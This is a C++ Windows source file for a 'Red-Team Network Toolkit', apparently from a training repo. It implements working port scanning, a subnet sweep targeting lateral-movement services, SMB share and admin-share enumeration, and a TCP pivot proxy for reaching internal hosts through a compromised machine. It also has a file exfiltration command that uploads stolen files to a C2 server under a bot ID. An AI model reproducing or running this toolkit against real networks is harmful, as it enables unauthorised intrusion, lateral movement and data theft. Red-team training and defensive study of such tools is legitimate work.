/*
  net_toolkit.cpp — Red-Team Network Toolkit (Module 14 workable)
  ================================================================
  Extends the educational scanner in docs/14-network-tools/net_toolkit.cpp
  with red-team reconnaissance and lateral-movement support.

  Compile:
    g++ -std=c++17 -O2 -o net_toolkit.exe net_toolkit.cpp \
        -lws2_32 -liphlpapi -ldnsapi -lnetapi32

  Commands:
    net_toolkit.exe scan    <host>   <lo-hi>     — threaded TCP port scan + banner
    net_toolkit.exe sweep   <subnet>             — fast /24 live-host + service discovery
    net_toolkit.exe dns     <host>               — A/AAAA/MX/TXT/CNAME lookup
    net_toolkit.exe smb     <host>               — enumerate SMB shares (NetShareEnum)
    net_toolkit.exe grab    <host>   <port>       — raw TCP banner grab
    net_toolkit.exe exfil   <host>   <port> <auth_key> <file>  — upload file to C2 /upload
    net_toolkit.exe proxy   <lport>  <rhost> <rport>           — TCP pivot proxy
*/

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <windns.h>
#include <lm.h>
#include <wininet.h>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <algorithm>
#include <sstream>
#include <fstream>

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"iphlpapi.lib")
#pragma comment(lib,"dnsapi.lib")
#pragma comment(lib,"netapi32.lib")
#pragma comment(lib,"wininet.lib")

// ─── shared helpers ──────────────────────────────────────────────────────────
static std::string ip4str(DWORD le) {
    char b[INET_ADDRSTRLEN]; struct in_addr a; a.s_addr=le;
    inet_ntop(AF_INET,&a,b,sizeof(b)); return b;
}

static bool tcpOpen(const char* ip, int port, int timeoutMs) {
    SOCKET s = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if (s==INVALID_SOCKET) return false;
    u_long nb=1; ioctlsocket(s,FIONBIO,&nb);
    struct sockaddr_in sa{}; sa.sin_family=AF_INET; sa.sin_port=htons((u_short)port);
    inet_pton(AF_INET,ip,&sa.sin_addr);
    connect(s,(sockaddr*)&sa,sizeof(sa));
    fd_set wfds; FD_ZERO(&wfds); FD_SET(s,&wfds);
    struct timeval tv={timeoutMs/1000,(timeoutMs%1000)*1000};
    bool open = (select(0,nullptr,&wfds,nullptr,&tv)>0 && FD_ISSET(s,&wfds));
    closesocket(s);
    return open;
}

static std::string grabBanner(const char* ip, int port, int timeoutMs) {
    SOCKET s = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if (s==INVALID_SOCKET) return "";
    u_long nb=1; ioctlsocket(s,FIONBIO,&nb);
    struct sockaddr_in sa{}; sa.sin_family=AF_INET; sa.sin_port=htons((u_short)port);
    inet_pton(AF_INET,ip,&sa.sin_addr);
    connect(s,(sockaddr*)&sa,sizeof(sa));
    fd_set wfds; FD_ZERO(&wfds); FD_SET(s,&wfds);
    struct timeval tv={timeoutMs/1000,(timeoutMs%1000)*1000};
    std::string banner;
    if (select(0,nullptr,&wfds,nullptr,&tv)>0 && FD_ISSET(s,&wfds)) {
        nb=0; ioctlsocket(s,FIONBIO,&nb);
        DWORD rcvtmo=300; setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(char*)&rcvtmo,sizeof(rcvtmo));
        char buf[257]{}; int r=recv(s,buf,sizeof(buf)-1,0);
        if (r>0) {
            banner=std::string(buf,r);
            size_t nl=banner.find_first_of("\r\n");
            if(nl!=std::string::npos) banner=banner.substr(0,nl);
            for(char& c:banner) if((unsigned char)c<32||(unsigned char)c>126) c='.';
        }
    }
    closesocket(s);
    return banner;
}

static const char* svcName(int port) {
    switch(port){
        case 21: return "FTP";   case 22: return "SSH";    case 23: return "Telnet";
        case 25: return "SMTP";  case 53: return "DNS";    case 80: return "HTTP";
        case 110:return "POP3";  case 135:return "RPC";    case 139:return "NetBIOS";
        case 143:return "IMAP";  case 443:return "HTTPS";  case 445:return "SMB";
        case 1433:return "MSSQL";case 3306:return "MySQL"; case 3389:return "RDP";
        case 5985:return "WinRM";case 5986:return "WinRMS";case 8080:return "HTTP-alt";
        case 8443:return "HTTPS-alt"; default: return "";
    }
}

// ─── scan: threaded TCP port scan ────────────────────────────────────────────
struct ScanResult { int port; std::string banner; };

static void cmd_scan(const char* host, int lo, int hi) {
    // Resolve to IP first
    struct addrinfo hints{},*res=nullptr;
    hints.ai_family=AF_INET; hints.ai_socktype=SOCK_STREAM;
    char ip[INET_ADDRSTRLEN]="";
    if(getaddrinfo(host,nullptr,&hints,&res)==0){
        inet_ntop(AF_INET,&((sockaddr_in*)res->ai_addr)->sin_addr,ip,sizeof(ip));
        freeaddrinfo(res);
    } else { fprintf(stderr,"Cannot resolve %s\n",host); return; }

    printf("Scanning %s (%s) ports %d-%d ...\n\n", host, ip, lo, hi);

    std::vector<ScanResult> open;
    std::mutex mtx;
    std::vector<std::thread> pool;
    std::atomic<int> idx{lo};

    auto worker = [&]{
        while(true){
            int p=idx.fetch_add(1);
            if(p>hi) break;
            if(tcpOpen(ip,p,500)){
                std::string b=grabBanner(ip,p,300);
                std::lock_guard<std::mutex> lk(mtx);
                open.push_back({p,b});
            }
        }
    };

    int nthreads=std::min(64,hi-lo+1);
    for(int i=0;i<nthreads;++i) pool.emplace_back(worker);
    for(auto& t:pool) t.join();

    std::sort(open.begin(),open.end(),[](auto& a,auto& b){return a.port<b.port;});
    for(auto& r:open){
        const char* svc=svcName(r.port);
        printf("  %-6d %-12s %s\n", r.port, svc, r.banner.empty()?"(no banner)":r.banner.c_str());
    }
    printf("\n[*] %zu open port(s) found.\n", open.size());
}

// ─── sweep: fast /24 live-host + Windows-service discovery ──────────────────
// Targets ports relevant to lateral movement: RDP/SMB/WinRM/RPC/MSSQL
static const int WIN_PORTS[] = {135,139,445,3389,5985,5986,1433,22,80,443,8080};
static const int N_WIN       = (int)(sizeof(WIN_PORTS)/sizeof(WIN_PORTS[0]));

struct HostResult { std::string ip; std::vector<int> ports; std::string rdns; };

static void cmd_sweep(const char* subnet) {
    // Accept "192.168.1" or "192.168.1.0/24" or "192.168.1.0"
    std::string base(subnet);
    // Strip trailing ".0" or ".0/24"
    size_t slash=base.find('/'); if(slash!=std::string::npos) base=base.substr(0,slash);
    size_t last=base.rfind('.'); if(last!=std::string::npos){
        std::string tail=base.substr(last+1);
        if(tail=="0"||tail=="") base=base.substr(0,last);
    }
    if(base.back()=='.') base.pop_back();

    printf("Sweeping %s.1-%s.254 (lateral-movement ports)...\n\n", base.c_str(), base.c_str());
    printf("  %-18s %-28s %s\n", "IP", "rDNS", "Open Services");
    printf("  %s\n", std::string(72,'-').c_str());

    std::vector<HostResult> alive;
    std::mutex mtx;
    std::atomic<int> host{1};

    auto worker = [&]{
        while(true){
            int h=host.fetch_add(1);
            if(h>254) break;
            char ip[32]; snprintf(ip,sizeof(ip),"%s.%d",base.c_str(),h);

            std::vector<int> open;
            for(int i=0;i<N_WIN;++i)
                if(tcpOpen(ip,WIN_PORTS[i],300))
                    open.push_back(WIN_PORTS[i]);
            if(open.empty()) continue;

            // rDNS
            std::string rdns;
            struct sockaddr_in sa{}; sa.sin_family=AF_INET; inet_pton(AF_INET,ip,&sa.sin_addr);
            char hbuf[256]={};
            if(getnameinfo((sockaddr*)&sa,sizeof(sa),hbuf,sizeof(hbuf),nullptr,0,NI_NAMEREQD)==0)
                rdns=hbuf;

            std::lock_guard<std::mutex> lk(mtx);
            alive.push_back({ip,open,rdns});
        }
    };

    std::vector<std::thread> pool;
    for(int i=0;i<64;++i) pool.emplace_back(worker);
    for(auto& t:pool) t.join();

    std::sort(alive.begin(),alive.end(),[](auto& a,auto& b){return a.ip<b.ip;});
    for(auto& h:alive){
        std::string svcList;
        for(int p:h.ports){
            if(!svcList.empty()) svcList+=" ";
            const char* s=svcName(p);
            if(s[0]) svcList+=std::string(s)+"("+std::to_string(p)+")";
            else svcList+=std::to_string(p);
        }
        printf("  %-18s %-28s %s\n",
               h.ip.c_str(),
               h.rdns.empty()?"(no rDNS)":h.rdns.c_str(),
               svcList.c_str());
    }
    printf("\n[*] %zu live hosts with open Windows services.\n", alive.size());

    // Print summary for lateral movement
    int rdp=0,smb=0,winrm=0;
    for(auto& h:alive){
        for(int p:h.ports){
            if(p==3389) ++rdp;
            if(p==445)  ++smb;
            if(p==5985||p==5986) ++winrm;
        }
    }
    if(rdp||smb||winrm)
        printf("[*] RDP targets: %d   SMB targets: %d   WinRM targets: %d\n",rdp,smb,winrm);
}

// ─── dns: A/AAAA/MX/TXT/CNAME ────────────────────────────────────────────────
static void cmd_dns(const char* host) {
    printf("=== DNS: %s ===\n\n", host);
    struct addrinfo hints{},*r=nullptr;
    hints.ai_family=AF_UNSPEC; hints.ai_socktype=SOCK_STREAM;
    printf("[A/AAAA]\n");
    if(getaddrinfo(host,nullptr,&hints,&r)==0){
        for(struct addrinfo* ai=r;ai;ai=ai->ai_next){
            char ip[INET6_ADDRSTRLEN]={};
            if(ai->ai_family==AF_INET)
                inet_ntop(AF_INET,&((sockaddr_in*)ai->ai_addr)->sin_addr,ip,sizeof(ip));
            else
                inet_ntop(AF_INET6,&((sockaddr_in6*)ai->ai_addr)->sin6_addr,ip,sizeof(ip));
            printf("  %-6s %s\n",ai->ai_family==AF_INET?"A":"AAAA",ip);
        }
        freeaddrinfo(r);
    } else printf("  (none)\n");

    PDNS_RECORD rec=nullptr;
    printf("\n[MX]\n");
    if(DnsQuery_A(host,DNS_TYPE_MX,DNS_QUERY_STANDARD,nullptr,&rec,nullptr)==ERROR_SUCCESS){
        for(PDNS_RECORD p=rec;p;p=p->pNext)
            if(p->wType==DNS_TYPE_MX)
                printf("  pref=%-4u  %s\n",p->Data.MX.wPreference,p->Data.MX.pNameExchange);
        DnsRecordListFree(rec,DnsFreeRecordList); rec=nullptr;
    } else printf("  (none)\n");

    printf("\n[TXT]\n");
    if(DnsQuery_A(host,DNS_TYPE_TEXT,DNS_QUERY_STANDARD,nullptr,&rec,nullptr)==ERROR_SUCCESS){
        for(PDNS_RECORD p=rec;p;p=p->pNext)
            if(p->wType==DNS_TYPE_TEXT)
                for(DWORD i=0;i<p->Data.TXT.dwStringCount;i++)
                    printf("  \"%s\"\n",p->Data.TXT.pStringArray[i]);
        DnsRecordListFree(rec,DnsFreeRecordList);
    } else printf("  (none)\n");
}

// ─── smb: enumerate shares via NetShareEnum ───────────────────────────────────
// Demonstrates the network share enumeration technique used during lateral movement
// reconnaissance — no credentials needed for null-session checks on older systems.
static void cmd_smb(const char* host) {
    printf("=== SMB Shares: %s ===\n\n", host);

    // Convert host to wide
    wchar_t whost[256]={};
    MultiByteToWideChar(CP_ACP,0,host,-1,whost,255);

    PSHARE_INFO_1 buf=nullptr;
    DWORD entries=0, total=0;
    NET_API_STATUS rc = NetShareEnum(whost, 1, (LPBYTE*)&buf, MAX_PREFERRED_LENGTH,
                                     &entries, &total, nullptr);
    if(rc!=NERR_Success && rc!=ERROR_MORE_DATA){
        printf("[-] NetShareEnum failed: %lu\n", rc);
        printf("    (host may require authentication or SMB is blocked)\n");
        return;
    }

    printf("  %-20s %-12s %s\n","Name","Type","Remark");
    printf("  %s\n",std::string(64,'-').c_str());
    for(DWORD i=0;i<entries;++i){
        char name[256]={},remark[256]={};
        WideCharToMultiByte(CP_ACP,0,buf[i].shi1_netname,-1,name,sizeof(name),nullptr,nullptr);
        WideCharToMultiByte(CP_ACP,0,buf[i].shi1_remark,-1,remark,sizeof(remark),nullptr,nullptr);
        const char* type="Disk";
        switch(buf[i].shi1_type & ~STYPE_SPECIAL){
            case STYPE_IPC:   type="IPC"; break;
            case STYPE_PRINTQ:type="Print"; break;
            case STYPE_DEVICE:type="Device"; break;
        }
        bool hidden=(name[0]&&name[strlen(name)-1]=='$');
        printf("  %-20s %-12s %s%s\n",name,type,remark,hidden?" [hidden]":"");
    }
    printf("\n  Total: %lu shares\n", total);
    if(buf) NetApiBufferFree(buf);

    // Also check if default shares are accessible
    const char* defShares[]={"C$","D$","ADMIN$","IPC$",nullptr};
    printf("\n[Default shares]\n");
    for(int i=0;defShares[i];++i){
        char unc[256]; snprintf(unc,sizeof(unc),"\\\\%s\\%s",host,defShares[i]);
        DWORD attr=GetFileAttributesA(unc);
        printf("  %-20s %s\n",unc,attr!=INVALID_FILE_ATTRIBUTES?"[ACCESSIBLE]":"[denied/inaccessible]");
    }
}

// ─── grab: raw TCP banner grab ───────────────────────────────────────────────
static void cmd_grab(const char* host, int port) {
    printf("Banner grab: %s:%d\n\n", host, port);
    struct addrinfo hints{},*res=nullptr;
    hints.ai_family=AF_INET; hints.ai_socktype=SOCK_STREAM;
    char portstr[16]; snprintf(portstr,sizeof(portstr),"%d",port);
    char ip[INET_ADDRSTRLEN]="";
    if(getaddrinfo(host,portstr,&hints,&res)==0){
        inet_ntop(AF_INET,&((sockaddr_in*)res->ai_addr)->sin_addr,ip,sizeof(ip));
        freeaddrinfo(res);
    } else { fprintf(stderr,"Cannot resolve %s\n",host); return; }

    std::string b=grabBanner(ip,port,5000);
    if(!b.empty()) printf("Banner: %s\n",b.c_str());
    else           printf("(no banner)\n");
    printf("Service: %s\n", svcName(port)[0]?svcName(port):"unknown");
}

// ─── exfil: upload file to C2 server's /upload endpoint ─────────────────────
// Demonstrates HTTP-based data exfiltration — pairs with c2-server/ in this repo.
// GET /upload?auth=<key>&id=<bot_id>  with multipart body carrying the file.
static std::string urlEncode(const std::string& s){
    std::string o;
    for(unsigned char c:s){
        if(isalnum(c)||c=='-'||c=='_'||c=='.'||c=='~') o+=(char)c;
        else{char b[4];snprintf(b,sizeof(b),"%%%02X",c);o+=b;}
    }
    return o;
}

static void cmd_exfil(const char* host, int port, const char* auth, const char* filepath) {
    // Read file
    std::ifstream f(filepath, std::ios::binary);
    if(!f){ fprintf(stderr,"Cannot open %s\n",filepath); return; }
    std::vector<char> data((std::istreambuf_iterator<char>(f)),std::istreambuf_iterator<char>());
    f.close();
    printf("[*] Exfiltrating %s (%zu bytes) → %s:%d ...\n", filepath, data.size(), host, port);

    // Build bot ID from hostname
    char hn[64]={}; DWORD hs=sizeof(hn); GetComputerNameA(hn,&hs);
    std::string botId(hn);

    // Multipart body
    std::string boundary="----BoundaryXkTrZu0gW";
    const char* fname=strrchr(filepath,'\\');
    fname=(fname?fname+1:filepath);

    std::string body;
    body = "--"+boundary+"\r\n";
    body += "Content-Disposition: form-data; name=\"file\"; filename=\""+std::string(fname)+"\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body.append(data.data(), data.size());
    body += "\r\n--"+boundary+"--\r\n";

    std::string hdr = "Content-Type: multipart/form-data; boundary="+boundary+"\r\n";
    std::string path = "/upload?auth="+urlEncode(auth)+"&id="+urlEncode(botId);

    HINTERNET hi = InternetOpenA("Mozilla/5.0",INTERNET_OPEN_TYPE_PRECONFIG,nullptr,nullptr,0);
    HINTERNET hc = InternetConnectA(hi,host,(INTERNET_PORT)port,nullptr,nullptr,
                                     INTERNET_SERVICE_HTTP,0,0);
    DWORD flags = INTERNET_FLAG_RELOAD;
    HINTERNET hr = HttpOpenRequestA(hc,"POST",path.c_str(),nullptr,nullptr,nullptr,flags,0);
    bool ok = HttpSendRequestA(hr,hdr.c_str(),(DWORD)hdr.size(),(LPVOID)body.c_str(),(DWORD)body.size())!=0;
    printf("[%s] Upload %s\n", ok?"+" : "-", ok?"complete":"failed");
    InternetCloseHandle(hr); InternetCloseHandle(hc); InternetCloseHandle(hi);
}

// ─── proxy: TCP pivot proxy ──────────────────────────────────────────────────
// Forwards TCP connections lport → rhost:rport for network pivoting.
// Useful when an internal target can only be reached through a compromised host.
static DWORD WINAPI pipeThread(LPVOID p){
    SOCKET* pair=(SOCKET*)p;
    char buf[8192]; int n;
    while((n=recv(pair[0],buf,sizeof(buf),0))>0) send(pair[1],buf,n,0);
    shutdown(pair[1],SD_SEND); return 0;
}

static void cmd_proxy(int lport, const char* rhost, int rport){
    printf("[*] TCP proxy: 0.0.0.0:%d → %s:%d  (Ctrl+C to stop)\n\n",lport,rhost,rport);
    SOCKET srv=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    int opt=1; setsockopt(srv,SOL_SOCKET,SO_REUSEADDR,(char*)&opt,sizeof(opt));
    sockaddr_in sa{}; sa.sin_family=AF_INET; sa.sin_addr.s_addr=INADDR_ANY; sa.sin_port=htons((u_short)lport);
    bind(srv,(sockaddr*)&sa,sizeof(sa)); listen(srv,8);

    while(true){
        sockaddr_in ca{}; int cl=sizeof(ca);
        SOCKET in=accept(srv,(sockaddr*)&ca,&cl);
        if(in==INVALID_SOCKET) break;
        char pip[INET_ADDRSTRLEN]; inet_ntop(AF_INET,&ca.sin_addr,pip,sizeof(pip));

        // Connect upstream
        struct addrinfo hints{},*res=nullptr;
        hints.ai_family=AF_INET; hints.ai_socktype=SOCK_STREAM;
        char ps[16]; snprintf(ps,sizeof(ps),"%d",rport);
        SOCKET out=INVALID_SOCKET;
        if(getaddrinfo(rhost,ps,&hints,&res)==0){
            out=socket(res->ai_family,res->ai_socktype,res->ai_protocol);
            if(connect(out,res->ai_addr,(int)res->ai_addrlen)!=0){closesocket(out);out=INVALID_SOCKET;}
            freeaddrinfo(res);
        }
        if(out==INVALID_SOCKET){closesocket(in); continue;}
        printf("[+] %s → %s:%d\n",pip,rhost,rport);

        // Bidirectional pipe: two threads
        static SOCKET p1[2],p2[2];
        p1[0]=in;  p1[1]=out;
        p2[0]=out; p2[1]=in;
        HANDLE h1=CreateThread(nullptr,0,pipeThread,p1,0,nullptr);
        HANDLE h2=CreateThread(nullptr,0,pipeThread,p2,0,nullptr);
        CloseHandle(h1); CloseHandle(h2);
    }
    closesocket(srv);
}

// ─── entry ───────────────────────────────────────────────────────────────────
static void usage(){
    puts("net_toolkit — Red-Team Network Toolkit\n"
         "  scan   <host>  <lo-hi>              threaded port scan + banner grab\n"
         "  sweep  <subnet>                      /24 live-host + Windows-service sweep\n"
         "  dns    <host>                         A/AAAA/MX/TXT/CNAME lookup\n"
         "  smb    <host>                         enumerate SMB shares (NetShareEnum)\n"
         "  grab   <host>  <port>                raw TCP banner grab\n"
         "  exfil  <host>  <port> <auth> <file>  upload file to C2 /upload endpoint\n"
         "  proxy  <lport> <rhost> <rport>        TCP pivot proxy");
}

int main(int argc, char* argv[]){
    WSADATA wsa; WSAStartup(MAKEWORD(2,2),&wsa);
    if(argc<2){usage();return 1;}
    const char* cmd=argv[1];

    if(strcmp(cmd,"scan")==0){
        if(argc<4){fprintf(stderr,"scan needs <host> <lo-hi>\n");return 1;}
        int lo=1,hi=1024;
        const char* range=argv[3];
        const char* dash=strchr(range,'-');
        if(dash){lo=atoi(range);hi=atoi(dash+1);}else{lo=hi=atoi(range);}
        cmd_scan(argv[2],lo,hi);
    }
    else if(strcmp(cmd,"sweep")==0){
        if(argc<3){fprintf(stderr,"sweep needs <subnet>\n");return 1;}
        cmd_sweep(argv[2]);
    }
    else if(strcmp(cmd,"dns")==0){
        if(argc<3){fprintf(stderr,"dns needs <host>\n");return 1;}
        cmd_dns(argv[2]);
    }
    else if(strcmp(cmd,"smb")==0){
        if(argc<3){fprintf(stderr,"smb needs <host>\n");return 1;}
        cmd_smb(argv[2]);
    }
    else if(strcmp(cmd,"grab")==0){
        if(argc<4){fprintf(stderr,"grab needs <host> <port>\n");return 1;}
        cmd_grab(argv[2],atoi(argv[3]));
    }
    else if(strcmp(cmd,"exfil")==0){
        if(argc<6){fprintf(stderr,"exfil needs <host> <port> <auth> <file>\n");return 1;}
        cmd_exfil(argv[2],atoi(argv[3]),argv[4],argv[5]);
    }
    else if(strcmp(cmd,"proxy")==0){
        if(argc<5){fprintf(stderr,"proxy needs <lport> <rhost> <rport>\n");return 1;}
        cmd_proxy(atoi(argv[2]),argv[3],atoi(argv[4]));
    }
    else{fprintf(stderr,"Unknown command: %s\n\n",cmd);usage();return 1;}

    WSACleanup();
    return 0;
}
